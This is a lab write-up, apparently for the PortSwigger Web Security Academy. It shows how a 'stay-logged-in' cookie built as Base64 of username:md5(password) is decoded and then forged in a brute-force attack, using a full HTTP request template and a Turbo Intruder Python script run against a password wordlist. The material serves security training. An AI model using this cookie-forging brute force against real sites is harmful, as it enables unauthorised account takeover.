---
title: Brute-forcing a stay-logged-in cookie
category: Authentication
difficulty: Practitioner
tags:
  - broken-access-control
  - brute-force
---
The goal of this lab is to take advantage of a "stay logged in" functionality. Websites often implement it as a cookie, which can potentially be created in a predictable manner and then crafted to gain access to a different account.

First let's log in with given credentials for `wiener`.
![[brute-forcing-a-stay-logged-in-cookie-img1.png]]

We can see a different cookie `stay-logged-in` with a value of `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`, which is most likely encoded with Base64. 

Decoding the value gives `wiener:51dc30ddc473d43a6011e9ebba6ca770`, which reveals the first part is the username. The second part is likely the result of a hashing function - it might be a hashed password. The length suggests it might be just MD5.

Checking the password's MD5 hash reveals an exact match of the value in the cookie:
```bash
echo -n "peter" | md5sum                                               
51dc30ddc473d43a6011e9ebba6ca770
```

Therefore, we have established that the cookie is a Base64 encoded value of `username:md5(password)`. To take advantage of this functionality, we can create a Turbo Intruder script that will create such cookies in a brute-force attack.

The HTTP skeleton of the request is (remember to remove the `session` cookie):
```http
GET /my-account?id=carlos HTTP/1.1
Host: 0a(...)80.web-security-academy.net
Cookie: stay-logged-in=%s
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a(...)80.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

The Turbo Intruder snippet will craft these `stay-logged-in` cookies to log in as our victim.
```python
import random
import base64
import hashlib

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.BURP
                           )

    for word in open('/home/kali/Downloads/PS-WSA-passwords.txt'):
        hashed_pw = hashlib.md5(word.strip().encode('utf-8')).hexdigest() #remember to strip - correct hashes won't be generated otherwise
        cookie = "carlos:" + hashed_pw
        cookie_b64 = base64.b64encode(cookie.encode('utf-8')).encode('utf-8') #the second encode is probably useless, but it does not hurt
        engine.queue(target.req, cookie_b64)


def handleResponse(req, interesting):
    table.add(req)

```

The attack was successful - we got access as user `carlos`.
![[brute-forcing-a-stay-logged-in-cookie-img2.png]]